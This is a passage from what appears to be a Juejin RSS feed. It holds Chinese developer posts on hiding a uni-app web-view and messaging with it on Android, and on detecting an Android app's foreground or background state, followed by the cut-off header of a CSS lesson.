outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>最近使用 uni-app 开发安卓端的 App，因为要嵌入一个原本已经开发完的系统，打算使用 web-view 的方式进行嵌入。</p>
<p>因为项目工期比较紧，所以是两个前端并行开发，最后再合到一起。</p>
<p>结果就是这个过程中出问题了...</p>
<h2 data-id="heading-0">需求</h2>
<p>需求方面是：</p>
<p><code>A同学</code>负责通讯方面的工作，所以页面应该在首页加载的时候就被挂载上去，这样一来启动系统的时候就注册了通讯模块，不影响收发信息。</p>
<p><code>B同学</code>负责其他部分，在首页展示系统内部的统计数据，可以算是一个安卓端的简易大屏。</p>
<p>原本<code>A同学</code>的方案是在系统页面上创建一个 <code>web-view</code>，然后嵌入系统。这样一来也不影响B同学开发新系统。</p>
<h2 data-id="heading-1">问题</h2>
<p>结果整合代码的时候才发现，<code>web-view</code>标签 是<strong>自动铺满整个页面</strong>的，而且是<strong>无法隐藏</strong>的。</p>
<p>这就尴尬了，App进来以后直接看到的就是 <code>A同学</code>的通讯页面，无法看到<code>B同学</code>的大屏了。</p>
<p>问题抛到了我手里，我经过一番简单的调研，再加上一顿猛如虎的操作，又通过 <strong>Trae</strong> 一顿AI，最后回复他们说：<strong>无解</strong>！</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/43f8dfd3e0884546ab40824d14f7de63~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5YmR5LiA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768993404&amp;x-signature=lUwkIJyI5td7ffl7BJad83W77OI%3D" alt="image.png" loading="lazy"/></p>
<p>对此 <strong>Trae</strong> 给出的原因是：uni-app 中内置的 <code>web-view</code> 标签本身没有隐藏的API，在 web-view 标签外增加 view 标签，绑定 <code>v-show</code> 方法不生效。</p>
<p>只能绑定 <code>v-if</code> 生效，但是绑定 <code>v-if=false</code> 的时候相当于 web-view 直接被<strong>销毁</strong>了，会导致通讯模块收不到信息。</p>
<h2 data-id="heading-2">解决</h2>
<p>好在天无绝人之路，uni-app 官方文档中表示：在 html5+ 中其实存在 web-view 的 API，能够操作窗口的大小。</p>
<p>那么既然能够操作窗口的大小，肯定也能够控制显隐。</p>
<p>于是乎我使用 <strong>Trae</strong> 让他使用 html5+ 中的 <code>create</code> 方法创建 web-view，并给出完整的解决方案。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">createWebView</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">let</span> that = <span class="hljs-variable language_">this</span>;
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">webviewIns</span>) <span class="hljs-keyword">return</span>;

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">webviewIns</span> = plus.<span class="hljs-property">webview</span>.<span class="hljs-title function_">create</span>(
        <span class="hljs-string">'http://192.168.25.110'</span>,
        <span class="hljs-string">'1008610010'</span> <span class="hljs-comment">// ID（必须唯一）</span>
        {
            <span class="hljs-attr">top</span>: <span class="hljs-string">'24px'</span>,
            <span class="hljs-attr">bottom</span>: <span class="hljs-string">'0px'</span>,
            <span class="hljs-attr">width</span>: <span class="hljs-string">'300px'</span>,
            <span class="hljs-attr">height</span>: <span class="hljs-string">'600px'</span>,
            <span class="hljs-attr">scrollIndicator</span>: <span class="hljs-string">'none'</span>,
            <span class="hljs-attr">scalable</span>: <span class="hljs-literal">false</span>
        }
    );

    <span class="hljs-comment">// 设置页面默认隐藏</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">webviewIns</span>.<span class="hljs-title function_">hide</span>();
}
</code></pre>
<p>这时候已经成功创建了 web-view 并且处于隐藏状态，不耽误传参。</p>
<p>但是又遇到了一个问题，web-view无法与uni-app<strong>通信</strong>。</p>
<p>Trae 先给出了 uni-app 官方提供的方法，使用 <code>uni.postMessage</code> 方法，但是在通讯系统中插入了这个方法以后，不报错，并且显示发送消息成功，但uni-app 这边却无法接收到。</p>
<p>Trae 又使用 <code>evalJS</code> 方法插入相应的脚本，但是也没有反应。同样是发送成功，但是接收不到。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c0b779ce4c0a4794bd4cdced445bdf0b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5YmR5LiA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768993404&amp;x-signature=wYXK%2FZQTfX9bGYH%2B5khBzLiAuOE%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<p>两种方案均不可用，我又详细看了看 uni-app 的官方文档，让 Trae 分析 web-view 标签上绑定的 <code>@message</code> 方法应该是经过特殊封装的，能够捕获到 view-view 内使用 <code>uni.postMessage</code> 方法发送的数据。</p>
<p>Trae给出的解释是：由于我现在使用 <code>plus.web-view.create</code> 创建窗口，绕过了uni-app 所以即便是绑定 <code>message</code> 也无效了。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3b0c925c31d3435ab879f6a3908f9626~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5YmR5LiA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768993404&amp;x-signature=Z%2B%2Fx0VnhbT5iKgYi9Gqpbs1TiiU%3D" alt="image.png" loading="lazy"/></p>
<p>所以采用 html+ 原生方法发送数据，在 web-view 中使用 <code>plus.webview.postMessageToUniNView</code> 方法发送数据。</p>
<p>在 uni-app 端使用 <code>plus.globalEvent.addEventListener</code> 接收数据。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 发送数据</span>
<span class="hljs-title function_">pushMessage</span>(<span class="hljs-params"/>) {
    plus.<span class="hljs-property">webview</span>.<span class="hljs-title function_">postMessageToUniNView</span>({
        <span class="hljs-attr">type</span>: <span class="hljs-string">'tpUniAPP'</span>,
        <span class="hljs-attr">args</span>: {
            <span class="hljs-attr">args1</span>: <span class="hljs-string">'test123'</span>
        }
    }, <span class="hljs-string">'__uniapp__service'</span>);
}
</code></pre>
<p>接收数据方法写在 <code>createWebView</code> 方法内。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 接收数据</span>
<span class="hljs-title function_">createWebView</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">let</span> that = <span class="hljs-variable language_">this</span>;
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">webviewIns</span>) <span class="hljs-keyword">return</span>;

    <span class="hljs-comment">// 创建一个新的 WebView</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">webviewIns</span> = plus.<span class="hljs-property">webview</span>.<span class="hljs-title function_">create</span>(
        ...
    );
    
    <span class="hljs-comment">// web-view加载完成</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">webviewIns</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'loaded'</span>, <span class="hljs-function">() =&gt;</span> {
        plus.<span class="hljs-property">globalEvent</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'plusMessage'</span>, <span class="hljs-function">(<span class="hljs-params">message</span>)=&gt;</span>{
            <span class="hljs-keyword">let</span> data = message?.<span class="hljs-property">data</span>?.<span class="hljs-property">args</span>?.<span class="hljs-property">data</span>;
            <span class="hljs-keyword">if</span>(data?.<span class="hljs-property">name</span> === <span class="hljs-string">'postMessage'</span>) {
                <span class="hljs-keyword">if</span> (data?.<span class="hljs-property">arg</span>?.<span class="hljs-property">type</span> === <span class="hljs-string">'show'</span>) {
                    <span class="hljs-comment">// 显示</span>
                    that.<span class="hljs-property">webviewIns</span>.<span class="hljs-title function_">show</span>();
                }
                <span class="hljs-keyword">if</span> (data?.<span class="hljs-property">arg</span>?.<span class="hljs-property">type</span> === <span class="hljs-string">'hide'</span>) {
                    <span class="hljs-comment">// 隐藏</span>
                    that.<span class="hljs-property">webviewIns</span>.<span class="hljs-title function_">hide</span>();
                }
            }
        })
    });
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">webviewIns</span>.<span class="hljs-title function_">hide</span>();
},
</code></pre>
<h2 data-id="heading-3">结论</h2>
<p>目前主要解决了两个问题：</p>
<ol>
<li>web-view 大小、显隐不可控问题。</li>
<li>web-view 与 uni-app 通信问题。</li>
</ol>
<p>发送数据方法可以卸载 Pinia 的公共方法中，或者使用 EventBus，统一处理。</p>
<p>Ps: 第二个问题解决方案不是太优雅，如果有兄弟有更好的方案可以分享一下。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android 开发中，准确判断应用处于“前台（Foreground）”还是“后台（Background）]]></title>    <link>https://juejin.cn/post/7595108457496346639</link>    <guid>https://juejin.cn/post/7595108457496346639</guid>    <pubDate>2026-01-15T06:28:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595108457496346639" data-draft-id="7595147176752332800" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android 开发中，准确判断应用处于“前台（Foreground）”还是“后台（Background）"/> <meta itemprop="keywords" content="Android,客户端,APP"/> <meta itemprop="datePublished" content="2026-01-15T06:28:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Gemini001"/> <meta itemprop="url" content="https://juejin.cn/user/2333635831676704"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android 开发中，准确判断应用处于“前台（Foreground）”还是“后台（Background）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2333635831676704/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Gemini001
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T06:28:55.000Z" title="Thu Jan 15 2026 06:28:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Android 应用前后台状态判断深度解析</h2>
<p>在 Android 开发中，准确判断应用处于<strong>前台（Foreground）</strong> 还是<strong>后台（Background）</strong> 是实现很多业务逻辑的基础。本文将深入分析目前最为主流且可靠的两种实现方式：<strong>Jetpack ProcessLifecycleOwner</strong>​ 和 <strong>ActivityLifecycleCallbacks 计数法</strong>，并从源码角度分析它们的底层工作原理。</p>
<hr/>
<h3 data-id="heading-1">一、方案一：Jetpack ProcessLifecycleOwner（官方首选）</h3>
<p>这是 Google 推荐的标准做法。它将整个 App 的进程抽象为一个 <code>LifecycleOwner</code>。</p>
<h4 data-id="heading-2">1. 使用方法</h4>
<p>在 <code>build.gradle</code>中引入：</p>
<pre><code class="hljs language-arduino" lang="arduino">implementation <span class="hljs-string">"androidx.lifecycle:lifecycle-process:2.6.2"</span>
</code></pre>
<p>在 <code>Application</code>中监听：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyApp</span> : <span class="hljs-type">Application</span>() {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">super</span>.onCreate()
        ProcessLifecycleOwner.<span class="hljs-keyword">get</span>().lifecycle.addObserver(
            <span class="hljs-keyword">object</span> : DefaultLifecycleObserver {
                <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onStart</span><span class="hljs-params">(owner: <span class="hljs-type">LifecycleOwner</span>)</span></span> {
                    <span class="hljs-comment">// App 回到前台</span>
                }
                
                <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onStop</span><span class="hljs-params">(owner: <span class="hljs-type">LifecycleOwner</span>)</span></span> {
                    <span class="hljs-comment">// App 退到后台</span>
                }
            }
        )
    }
}
</code></pre>
<h4 data-id="heading-3">2. 源码原理分析</h4>
<p><code>ProcessLifecycleOwner</code>的核心是利用一个名为 <code>ProcessLifecycleOwnerInitializer</code>的 <code>ContentProvider</code>自动启动。</p>
<p>关键源码：<code>ProcessLifecyclePolicy</code>通过注册 <code>ActivityLifecycleCallbacks</code>来监听所有 Activity 的生命周期，并做了两件特殊的事：</p>
<p><strong>1. 分发延迟（TIMEOUT）</strong></p>
<p>源码中定义了 <code>TIMEOUT_MS = 700ms</code>：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 源码伪代码</span>
void <span class="hljs-built_in">onActivityStopped</span>() {
    mStartedCounter--;
    if (mStartedCounter == <span class="hljs-number">0</span> &amp;&amp; mPauseSent) {
        <span class="hljs-comment">// 并不是立即发送 Stop，而是通过 Handler 延迟发送</span>
        mHandler<span class="hljs-selector-class">.postAtTime</span>(mDelayedPauseRunnable, mLastPausedTime + TIMEOUT_MS);
    }
}
</code></pre>
<p><strong>原理</strong>：当 Activity A 切换到 Activity B 时，A 会先 Stop，B 再 Start。如果没有这个延迟，App 会在切换瞬间产生一次"掉入后台再回到前台"的误判。这 700ms 确保了 Activity 跳转时的连续性。</p>
<p><strong>2. 状态挂钩</strong></p>
<p>它不仅监听 <code>onStop</code>，还监听 <code>onPause</code>。只有当最后一个 Activity 真正不可见且超过了缓冲时间，才会分发 <code>ON_STOP</code>事件。</p>
<hr/>
<h3 data-id="heading-4">二、方案二：ActivityLifecycleCallbacks 计数法（灵活自研）</h3>
<p>如果你不想引入 Lifecycle 库，或者需要在回调中立即拿到当前 Activity 实例，这是最可靠的替代方案。</p>
<h4 data-id="heading-5">1. 实现逻辑</h4>
<p>利用 <code>Application.ActivityLifecycleCallbacks</code>接口，通过一个全局计数器统计 Started 状态的 Activity 数量：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AppForegroundDetector</span> : <span class="hljs-type">Application.ActivityLifecycleCallbacks</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> startCounter = <span class="hljs-number">0</span>
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onActivityStarted</span><span class="hljs-params">(activity: <span class="hljs-type">Activity</span>)</span></span> {
        <span class="hljs-keyword">if</span> (startCounter == <span class="hljs-number">0</span>) {
            <span class="hljs-comment">// 从 0 变为 1，说明是从后台进入前台</span>
            onAppForeground(activity)
        }
        startCounter++
    }
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onActivityStopped</span><span class="hljs-params">(activity: <span class="hljs-type">Activity</span>)</span></span> {
        startCounter--
        <span class="hljs-keyword">if</span> (startCounter == <span class="hljs-number">0</span>) {
            <span class="hljs-comment">// 从 1 变为 0，说明所有 Activity 都不可见了</span>
            onAppBackground()
        }
    }
    
    <span class="hljs-comment">// ... 其他方法空实现</span>
}
</code></pre>
<h4 data-id="heading-6">2. 深入原理分析</h4>
<p><strong>为什么是 <code>onActivityStarted</code>而不是 <code>onActivityResumed</code>？</strong></p>
<p>这是很多开发者的误区。我们来看 Android 系统的生命周期定义：</p>
<ul>
<li><strong>Started/Stopped</strong>：控制的是 Visibility（可见性）</li>
<li><strong>Resumed/Paused</strong>：控制的是 Focus（焦点）</li>
</ul>
<p><strong>异常场景分析</strong>：</p>
<ul>
<li><strong>场景 A（系统权限弹窗）</strong> ：当 App 弹出系统权限请求对话框时，当前 Activity 会失去焦点（执行 <code>onPause</code>），但它依然可见（不执行 <code>onStop</code>）。如果用 <code>Resumed</code>计数，此时会误判为 App 进入了后台</li>
<li><strong>场景 B（透明 Activity）</strong> ：如果你启动了一个透明的 Activity，前一个 Activity 会 <code>onPause</code>但不会 <code>onStop</code></li>
</ul>
<p>✅ <strong>结论</strong>：只有使用 <code>onActivityStarted/Stopped</code>才能真实反映 App 是否在用户视线内。</p>
<hr/>
<h3 data-id="heading-7">三、两种方案的对比与选择</h3>






























<table><thead><tr><th>特性</th><th>ProcessLifecycleOwner</th><th>ActivityLifecycleCallbacks 计数法</th></tr></thead><tbody><tr><td>集成难度</td><td>极低（添加依赖即可）</td><td>中（需要手动写计数逻辑）</td></tr><tr><td>及时性</td><td>有 700ms 延迟（防抖动）</td><td>实时触发（无延迟）</td></tr><tr><td>Activity 引用</td><td>无法直接获取当前 Activity</td><td>可以在回调中直接获取 Activity 实例</td></tr><tr><td>适用场景</td><td>绝大多数业务（初始化、统计）</td><td>需要在回到前台立刻弹窗、与 UI 强耦合的场景</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-8">四、最佳实践建议</h3>
<p>在实际商业项目中，推荐<strong>组合使用</strong>：</p>
<ol>
<li>
<p><strong>全局状态监控</strong>：使用 <code>ProcessLifecycleOwner</code>负责那些与 UI 无关的逻辑，比如：</p>
<ul>
<li>上报 App 在线时长</li>
<li>清理过期缓存</li>
<li>检查静默更新</li>
</ul>
</li>
<li>
<p><strong>UI 交互逻辑</strong>：如果你需要在 App 回到前台时立刻弹出一个"欢迎回来"的 Dialog，建议使用计数器方案，因为你可以通过 <code>onActivityStarted(activity: Activity)</code>直接拿到当前的 Context 来弹出对话框。</p>
</li>
</ol>
<p>⚠️ <strong>注意坑点</strong>：</p>
<p>由于 Android 处理进程杀死的机制，当进程在后台被系统回收后重新启动，<code>startCounter</code>会重新从 0 开始计算。这通常符合我们的预期，因为此时确实是"进入了前台"，但需要注意在 <code>onCreate</code>中恢复相关状态。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【 前端三剑客-39 /Lesson65(2025-12-12)】从基础几何图形到方向符号的演进与应用📐➡️🪜➡️🥧➡️⭕➡️🛞➡️🧭]]></title>    <link>https://juejin.cn/post/7595142651728248851</link>    <guid>https://juejin.cn/post/7595142651728248851</guid>    <pubDate>2026-01-15T10:22:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595142651728248851" data-draft-id="7595401278465851433" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【 前端三剑客-39 /Lesson65(2025-12-12)】从基础几何图形到方向符号的演进与应用📐➡️🪜➡️🥧➡️⭕➡️🛞➡️🧭"/> <meta itemprop="keywords" content="前端,CSS,HTML"/> <meta itemprop="datePublished" content="2026-01-15T10:22:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Jing_Rainbow"/> <meta itemprop="url" content="https://juejin.cn/user/1285809519198256"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【 前端三剑客-39 /Lesson65(2025-12-12)】从基础几何图形到方向符号的演进与应用📐➡️🪜➡️🥧➡️⭕➡️🛞➡️🧭
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1285809519198256/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Jing_Rainbow
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T10:22:43.000Z" title="Thu Jan 15 2026 10:22:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
